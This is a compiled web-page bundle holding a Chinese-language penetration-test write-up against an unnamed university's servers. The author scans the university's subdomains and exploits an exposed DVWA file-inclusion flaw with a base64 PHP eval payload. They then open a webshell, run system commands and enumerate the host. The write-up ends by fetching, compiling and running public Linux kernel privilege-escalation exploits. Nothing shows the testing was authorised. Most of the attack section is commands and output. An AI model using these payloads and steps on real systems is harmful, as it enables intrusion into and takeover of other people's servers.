"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[6873],{8453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>a});var t=s(6540);const i={},o=t.createContext(i);function r(e){const n=t.useContext(o);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(o.Provider,{value:n},e.children)}},8942:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>d,frontMatter:()=>r,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u6e17\u900f\u624b\u6cd5/\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5/README","title":"\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/05.\u6e17\u900f\u624b\u6cd5/01.\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5/README.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/05.\u6e17\u900f\u624b\u6cd5/01.\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u6e17\u900f\u624b\u6cd5/\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5/","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u6e17\u900f\u624b\u6cd5/\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5/","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/05.\u6e17\u900f\u624b\u6cd5/01.\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5/README.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Linux\u63d0\u6743","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5185\u7f51\u6e17\u900f/Linux\u63d0\u6743/"},"next":{"title":"SpringBoot\u6e17\u900f","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u6e17\u900f\u624b\u6cd5/SpringBoot\u6e17\u900f/"}}');var i=s(4848),o=s(8453);const r={},a="\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5",c={},l=[];function p(e){const n={code:"code",del:"del",h1:"h1",header:"header",img:"img",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,o.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5",children:"\u67d0\u5927\u5b66\u6e17\u900f\u6d4b\u8bd5"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,i.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,i.jsx)(n.tbody,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{style:{textAlign:"left"},children:(0,i.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,i.jsx)(n.td,{style:{textAlign:"left"},children:"2025-10-15 00:34:34"})]})})]}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528\u81ea\u52a8\u5316\u811a\u672c\u914d\u5408",(0,i.jsx)(n.code,{children:"pathScan"}),"\u3001",(0,i.jsx)(n.code,{children:"nuclei"}),"\u8fdb\u884c\u6f0f\u6d1e\u626b\u63cf"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"#!/bin/bash\n\n# \u83b7\u53d6\u811a\u672c\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u57df\u540d\ndomain=$1\n\n# \u68c0\u67e5\u662f\u5426\u63d0\u4f9b\u4e86\u57df\u540d\nif [ -z \"$domain\" ]; then\n            echo \"\u7528\u6cd5: $0 wjlin0.com\"\n                exit 1\nfi\noutput_path=./output/$domain\n\n# \u521b\u5efa\u8def\u5f84\nmkdir -p $output_path\n\n# \u626b\u63cf\u5b50\u57df\u540d (-sd \u53d1\u73b0\u66f4\u591a\u76ee\u6807)\npathScan -s -sq $domain -o $output_path/out.csv -csv -sd\n# \u6392\u9664 5xx \u548c 400 \u72b6\u6001\u7801\u7684\u7ed3\u679c\ncat $output_path/out.csv | awk -F, 'NR > 1 && !($9 ~ /^[5]/ || $9 == 400) { print $2 }' > $output_path/url_out.txt\n\n# \u4ece url_out.txt \u4e2d\u63d0\u53d6\u57df\u540d, \u5e76\u4e14\u53bb\u91cd\ncat $output_path/url_out.txt | awk -F/ '{ print $3 }' | sort -u > $output_path/domain_out.txt\n# \u6392\u9664 vpn \u76f8\u5173\u57df\u540d \n\n\n# \u626b\u63cf\u6f0f\u6d1e\nnuclei -list $output_path/url_out.txt -o $output_path/nuclei_out.txt\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u6709\u4e2a\u4e25\u91cd\uff0c\u597d\u5bb6\u4f19",(0,i.jsx)(n.code,{children:"dvwa"}),"\uff0c\u8fdb\u53bb\u770b\u770b"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644109.png",alt:"image-20240112211000138"})}),"\n",(0,i.jsxs)(n.p,{children:["\u770b\u4e00\u4e0b\u6709\u6ca1\u6709",(0,i.jsx)(n.code,{children:"disable_functions()"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"http://xx.xx/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8%2B&1=phpinfo();\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644110.png",alt:"image-20240112211429705"})}),"\n",(0,i.jsx)(n.p,{children:"\u5e94\u8be5\u662f\u6ca1\u6709 \u7528\u8681\u5251\u4e0a\u7ebf\u5427"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644111.png",alt:"image-20240112170550295"})}),"\n",(0,i.jsx)(n.p,{children:"\u770b\u4e00\u4e0b\u80fd\u4e0d\u80fd\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u53d1\u73b0\u80fd\uff0c\u8fd8\u633a\u597d"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644112.png",alt:"image-20240112170705054"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644113.png",alt:"image-20240112175624858"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",children:'Linux mituan-cg-2106 4.19.24-7.34.cbp.al7.x86_64 #1 SMP Thu Dec 15 08:56:31 UTC 2022 x86_64 GNU/Linux\n\nPRETTY_NAME="Debian GNU/Linux 9 (stretch)"\nNAME="Debian GNU/Linux"\nVERSION_ID="9"\nVERSION="9 (stretch)"\nID=debian\nHOME_URL="https://www.debian.org/"\nSUPPORT_URL="https://www.debian.org/support"\nBUG_REPORT_URL="https://bugs.debian.org/"\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u67e5\u627e\u6709\u6ca1\u6709suid"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"find / -perm -u=s -type f 2>/dev/null\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644114.png",alt:"image-20240112171848295"})}),"\n",(0,i.jsx)(n.p,{children:"\u4fe1\u606f\u6536\u96c6\u811a\u672c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:'wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-tex",children:"=====================( Current Output Verbosity Level: 0 )======================\n===============================================================( humanity )=====\n[!] nowar0 Should we question autocrats and their \"military operations\"?... yes!\n---\n                                      NO   \n                                      WAR  \n---\n==================================================================( users )=====\n[i] usr000 Current user groups............................................. yes!\n[*] usr010 Is current user in an administrative group?..................... nope\n[*] usr020 Are there other users in administrative groups?................. nope\n[*] usr030 Other users with shell.......................................... yes!\n[i] usr040 Environment information......................................... skip\n[i] usr050 Groups for other users.......................................... skip\n[i] usr060 Other users..................................................... skip\n[*] usr070 PATH variables defined inside /etc.............................. yes!\n[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope\n===================================================================( sudo )=====\n[!] sud000 Can we sudo without a password?................................. nope\n[!] sud010 Can we list sudo commands without a password?................... nope\n[!] sud020 Can we sudo with a password?.................................... nope\n[!] sud030 Can we list sudo commands with a password?...................... nope\n[*] sud040 Can we read sudoers files?...................................... nope\n[*] sud050 Do we know if any other users used sudo?........................ nope\n============================================================( file system )=====\n[*] fst000 Writable files outside user's home.............................. yes!\n[*] fst010 Binaries with setuid bit........................................ yes!\n[!] fst020 Uncommon setuid binaries........................................ nope\n[!] fst030 Can we write to any setuid binary?.............................. nope\n[*] fst040 Binaries with setgid bit........................................ skip\n[!] fst050 Uncommon setgid binaries........................................ skip\n[!] fst060 Can we write to any setgid binary?.............................. skip\n[*] fst070 Can we read /root?.............................................. nope\n[*] fst080 Can we read subdirectories under /home?......................... nope\n[*] fst090 SSH files in home directories................................... nope\n[*] fst100 Useful binaries................................................. yes!\n[*] fst110 Other interesting files in home directories..................... nope\n[!] fst120 Are there any credentials in fstab/mtab?........................ nope\n[*] fst130 Does 'www-data' have mail?...................................... nope\n[!] fst140 Can we access other users mail?................................. nope\n[*] fst150 Looking for GIT/SVN repositories................................ nope\n[!] fst160 Can we write to critical files?................................. nope\n[!] fst170 Can we write to critical directories?........................... nope\n[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope\n[!] fst190 Can we read any backup?......................................... nope\n[!] fst200 Are there possible credentials in any shell history file?....... nope\n[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope\n[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope\n[i] fst500 Files owned by user 'www-data'.................................. skip\n[i] fst510 SSH files anywhere.............................................. skip\n[i] fst520 Check hosts.equiv file and its contents......................... skip\n[i] fst530 List NFS server shares.......................................... skip\n[i] fst540 Dump fstab file................................................. skip\n=================================================================( system )=====\n[i] sys000 Who is logged in................................................ skip\n[i] sys010 Last logged in users............................................ skip\n[!] sys020 Does the /etc/passwd have hashes?............................... nope\n[!] sys022 Does the /etc/group have hashes?................................ nope\n[!] sys030 Can we read shadow files?....................................... nope\n[*] sys040 Check for other superuser accounts.............................. nope\n[*] sys050 Can root user log in via SSH?................................... nope\n[i] sys060 List available shells........................................... skip\n[i] sys070 System umask in /etc/login.defs................................. skip\n[i] sys080 System password policies in /etc/login.defs..................... skip\n===============================================================( security )=====\n[*] sec000 Is SELinux present?............................................. nope\n[*] sec010 List files with capabilities.................................... nope\n[!] sec020 Can we write to a binary with caps?............................. nope\n[!] sec030 Do we have all caps in any binary?.............................. nope\n[*] sec040 Users with associated capabilities.............................. nope\n[!] sec050 Does current user have capabilities?............................ skip\n[!] sec060 Can we read the auditd log?..................................... nope\n========================================================( recurrent tasks )=====\n[*] ret000 User crontab.................................................... nope\n[!] ret010 Cron tasks writable by user..................................... nope\n[*] ret020 Cron jobs....................................................... yes!\n[*] ret030 Can we read user crontabs....................................... nope\n[*] ret040 Can we list other user cron tasks?.............................. nope\n[*] ret050 Can we write to any paths present in cron jobs.................. yes!\n[!] ret060 Can we write to executable paths present in cron jobs........... nope\n[i] ret400 Cron files...................................................... skip\n[*] ret500 User systemd timers............................................. nope\n[!] ret510 Can we write in any system timer?............................... nope\n[i] ret900 Systemd timers.................................................. skip\n================================================================( network )=====\n[*] net000 Services listening only on localhost............................ yes!\n[!] net010 Can we sniff traffic with tcpdump?.............................. nope\n[i] net500 NIC and IP information.......................................... skip\n[i] net510 Routing table................................................... skip\n[i] net520 ARP table....................................................... skip\n[i] net530 Nameservers..................................................... skip\n[i] net540 Systemd Nameservers............................................. skip\n[i] net550 Listening TCP................................................... skip\n[i] net560 Listening UDP................................................... skip\n===============================================================( services )=====\n[!] srv000 Can we write in service files?.................................. nope\n[!] srv010 Can we write in binaries executed by services?.................. nope\n[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope\n[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope\n[*] srv040 Upstart files not belonging to root............................. nope\n[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope\n[i] srv400 Contents of /etc/inetd.conf..................................... skip\n[i] srv410 Contents of /etc/xinetd.conf.................................... skip\n[i] srv420 List /etc/xinetd.d if used...................................... skip\n[i] srv430 List /etc/init.d/ permissions................................... skip\n[i] srv440 List /etc/rc.d/init.d permissions............................... skip\n[i] srv450 List /usr/local/etc/rc.d permissions............................ skip\n[i] srv460 List /etc/init/ permissions..................................... skip\n[!] srv500 Can we write in systemd service files?.......................... nope\n[!] srv510 Can we write in binaries executed by systemd services?.......... nope\n[*] srv520 Systemd files not belonging to root............................. nope\n[i] srv900 Systemd config files permissions................................ skip\n===============================================================( software )=====\n[!] sof000 Can we connect to MySQL with root/root credentials?............. nope\n[!] sof010 Can we connect to MySQL as root without password?............... nope\n[!] sof015 Are there credentials in mysql_history file?.................... nope\n[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope\n[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope\n[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope\n[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope\n[*] sof030 Installed apache modules........................................ yes!\n[!] sof040 Found any .htpasswd files?...................................... nope\n[!] sof050 Are there private keys in ssh-agent?............................ nope\n[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope\n[!] sof070 Can we write to a ssh-agent socket?............................. nope\n[!] sof080 Can we write to a gpg-agent socket?............................. nope\n[!] sof090 Found any keepass database files?............................... nope\n[!] sof100 Found any 'pass' store directories?............................. nope\n[!] sof110 Are there any tmux sessions available?.......................... nope\n[*] sof120 Are there any tmux sessions from other users?................... nope\n[!] sof130 Can we write to tmux session sockets from other users?.......... nope\n[!] sof140 Are any screen sessions available?.............................. nope\n[*] sof150 Are there any screen sessions from other users?................. nope\n[!] sof160 Can we write to screen session sockets from other users?........ nope\n[*] sof170 Can we access MongoDB databases without credentials?............ nope\n[!] sof180 Can we access any Kerberos credentials?......................... nope\n[i] sof500 Sudo version.................................................... skip\n[i] sof510 MySQL version................................................... skip\n[i] sof520 Postgres version................................................ skip\n[i] sof530 Apache version.................................................. skip\n[i] sof540 Tmux version.................................................... skip\n[i] sof550 Screen version.................................................. skip\n=============================================================( containers )=====\n[*] ctn000 Are we in a docker container?................................... nope\n[*] ctn010 Is docker available?............................................ nope\n[!] ctn020 Is the user a member of the 'docker' group?..................... nope\n[*] ctn200 Are we in a lxc container?...................................... nope\n[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope\n==============================================================( processes )=====\n[i] pro000 Waiting for the process monitor to finish....................... yes!\n[i] pro001 Retrieving process binaries..................................... yes!\n[i] pro002 Retrieving process users........................................ yes!\n[!] pro010 Can we write in any process binary?............................. nope\n[*] pro020 Processes running with root permissions......................... yes!\n[*] pro030 Processes running by non-root users with shell.................. nope\n[i] pro500 Running processes............................................... skip\n[i] pro510 Running process binaries and permissions........................ skip\n===================================================================( CVEs )=====\n[!] cve-2019-5736 Escalate in some types of docker containers.............. nope\n[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... nope\n[!] cve-2021-3560 Checking for policykit vulnerability..................... nope\n[!] cve-2021-4034 Checking for PwnKit vulnerability........................ nope\n[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope\n[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope\n[!] cve-2023-22809 Sudoedit bypass in Sudo <= 1.9.12p1..................... nope\n\n==================================( FINISHED )==================================\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u67e5\u627e\u672c\u5730\u63d0\u6743\u6f0f\u6d1e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-tex",children:"./linux-exploit-suggester.sh\n\nAvailable information:\n\nKernel version: 4.19.24\nArchitecture: x86_64\nDistribution: N/A\nDistribution version: N/A\nAdditional checks (CONFIG_*, sysctl entries, custom Bash commands): performed\nPackage listing: N/A\n\nSearching among:\n\n81 kernel space exploits\n0 user space exploits\n\nPossible Exploits:\n\n[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)\n\n   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/\nhttps://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/\n   Exposure: less probable\n   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}\n   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c\n   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\n\n[+] [CVE-2022-2586] nft_object UAF\n\n   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5\n   Exposure: less probable\n   Tags: ubuntu=(20.04){kernel:5.12.13}\n   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1\n   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\n\n[+] [CVE-2021-27365] linux-iscsi\n\n   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html\n   Exposure: less probable\n   Tags: RHEL=8\n   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk\n   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled\n\n[+] [CVE-2021-22555] Netfilter heap out-of-bounds write\n\n   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html\n   Exposure: less probable\n   Tags: ubuntu=20.04{kernel:5.8.0-*}\n   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\n   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c\n   Comments: ip_tables kernel module must be loaded\n\n[+] [CVE-2019-15666] XFRM_UAF\n\n   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc\n   Exposure: less probable\n   Download URL: \n   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled\n\n[+] [CVE-2019-13272] PTRACE_TRACEME\n\n   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903\n   Exposure: less probable\n   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}\n   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip\n   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c\n   Comments: Requires an active PolKit agent.\n\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5c1d\u8bd5",(0,i.jsx)(n.code,{children:"CVE-2019-13272"})]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"wget https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u67e5\u770b",(0,i.jsx)(n.code,{children:"gblic"}),"\u7248\u672c"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"www-data@mituan-cg-2106:/tmp$ ldd --version\nldd (Debian GLIBC 2.24-11+deb9u3) 2.24\nCopyright (C) 2016 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.  There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\nWritten by Roland McGrath and Ulrich Drepper.\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5b89\u88c5",(0,i.jsx)(n.code,{children:"glibc-2.24"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.del,{children:"\u8fd9\u4e2a\u65b9\u6cd5\u51fa\u4e86\u5f88\u591a\u95ee\u9898\uff0c\u5e72\u8106\u653e\u5f03\u4e86 \u76f4\u63a5 \u7528docker \u7f16\u8bd1 poc \u5c31\u884c\u4e86\u54c7"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"mkdir -p /tmp/glibc-2.24/src-build/ && cd /tmp/glibc-2.24\nwget https://ftp.gnu.org/gnu/glibc/glibc-2.24.tar.gz && tar -xvf glibc-2.24.tar.gz\ncd src-build/ && ../configure --prefix=/opt/glibc-2.24\nmake && make install\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528docker \u7f16\u8bd1",(0,i.jsx)(n.code,{children:"glibc-2.24"})," \u548c \u7f16\u8bd1 ",(0,i.jsx)(n.code,{children:"poc"})," \u5e76\u76f4\u63a5\u5bfc\u51fa",(0,i.jsx)(n.code,{children:"a.out"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dockerfile",children:'# \u4f7f\u7528 Debian 9 (Stretch) \u4f5c\u4e3a\u57fa\u7840\u955c\u50cf\nFROM debian:9\n# \u89e3\u51b3  Debian 9 \u5df2\u7ecf\u8fbe\u5230\u4e86\u5176\u751f\u547d\u5468\u671f\u7684\u7ec8\u70b9\u5e76\u88ab\u79fb\u52a8\u5230\u4e86\u5f52\u6863\u72b6\u6001 \u95ee\u9898\nRUN echo "deb http://archive.debian.org/debian/ stretch main contrib non-free" > /etc/apt/sources.list \\\n    && echo "deb http://archive.debian.org/debian-security/ stretch/updates main" >> /etc/apt/sources.list\n\n# \u5b89\u88c5\u7f16\u8bd1\u4f9d\u8d56 \u5ffd\u7565 APT \u5b89\u5168\u8b66\u544a\nRUN apt-get -o Acquire::Check-Valid-Until=false update && apt-get install -y \\\n    build-essential \\\n    gcc \\\n    g++ \\\n    bison \\\n    perl \\\n    python3 \\\n    git \\\n    gawk \\\n    wget \n\n# \u521b\u5efa\u4e00\u4e2a\u5de5\u4f5c\u76ee\u5f55\nWORKDIR /glibc-build\n\n# \u514b\u9686 glibc \u6e90\u4ee3\u7801\nRUN git clone https://sourceware.org/git/glibc.git /glibc-source\n\n# \u5207\u6362\u5230\u7279\u5b9a\u7684\u7248\u672c\nRUN cd /glibc-source && git checkout glibc-2.24\n\n# \u914d\u7f6e\u6784\u5efa\u76ee\u5f55\nRUN mkdir /glibc-build/build\nWORKDIR /glibc-build/build\n\n# \u914d\u7f6e glibc\nRUN /glibc-source/configure --prefix=/opt/glibc-2.24\n\n# \u7f16\u8bd1\u548c\u5b89\u88c5\nRUN make -j$(nproc) && make install\n\n# \u8bbe\u7f6e\u5377\uff0c\u7528\u4e8e\u5bfc\u51fa\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\nVOLUME /tmp\n\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u6267\u884c\u547d\u4ee4 ",(0,i.jsx)(n.del,{children:"\u597d\u4e86\u5f00\u59cb\u7b49\u5f85\u4e2a\u4e0a\u4e07\u5e74"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"docker build -t glibc-2.24-debian9 .\ndocker run --rm -v /tmp/1:/tmp -it glibc-2.24-debian9 /bin/bash \n# \u5bb9\u5668\u4e2d\nwget https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c -O poc.c\ngcc -Wall --std=gnu99 -s /tmp/poc.c -o /tmp/ptrace_traceme_root\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4e0a\u4f20\u5e76\u6267\u884c ",(0,i.jsx)(n.del,{children:"\u73a9\u4e2a\u5c41\u767d\u8d39\u529b\u6c14"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"chmod +x /tmp/ptrace_traceme_root\n/tmp/ptrace_traceme_root\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644115.png",alt:"image-20240112202526854"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5c1d\u8bd5 ",(0,i.jsx)(n.code,{children:"CVE-2022-32250"})]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u4f7f\u7528\u4e0a\u9762docker \u5bb9\u5668\u73af\u5883\uff0c\u7f16\u8bd1poc"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"docker run --rm -v /tmp/1:/tmp -it glibc-2.24-debian9 /bin/bash \n# \u5bb9\u5668\u4e2d\nwget https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c -O exp.c\ngcc exp.c -o exp -l mnl -l nftnl -w\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.del,{children:"\u51fa\u9519\u5566"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644116.png",alt:"image-20240112204023742"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5b89\u88c5 ",(0,i.jsx)(n.code,{children:"libmnl"}),"\uff0c\u5e76\u518d\u6b21\u7f16\u8bd1"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"# \u5bb9\u5668\u4e2d\napt-get install -y libmnl-dev\ngcc exp.c -o exp -l mnl -l nftnl -w\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.del,{children:"\u8fd8\u662f\u51fa\u9519\u5566"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644117.png",alt:"image-20240112204205475"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5b89\u88c5 ",(0,i.jsx)(n.code,{children:"libnftnl-dev"}),"\uff0c\u5e76\u518d\u6b21\u7f16\u8bd1"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"apt install -y libnftnl-dev --allow-unauthenticated\ngcc exp.c -o exp -l mnl -l nftnl -w\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.del,{children:"\u53c8\u53c8\u53c8\u51fa\u9519\u4e86"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644118.png",alt:"image-20240112204841016"})}),"\n",(0,i.jsxs)(n.p,{children:["GPT\u63d0\u793a\u7684\u662f 5.1.x \u624d\u63d0\u4f9b\u7684 ",(0,i.jsx)(n.code,{children:"apt search linux-headers"})," \u770b\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u5e76\u6ca1\u6709\uff0c\u5c31\u653e\u5f03\u4e86"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644119.png",alt:"image-20240112205140417"})}),"\n",(0,i.jsx)(n.p,{children:"\u770b\u4e86\u4e00\u4e0b\u6570\u636e\u5e93\u4e5f\u6ca1\u6709\u5565\u597d\u7528\u7684\uff0c\u7b97\u4e86"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191644120.png",alt:"image-20240112212017967"})})]})}function d(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(p,{...e})}):p(e)}}}]);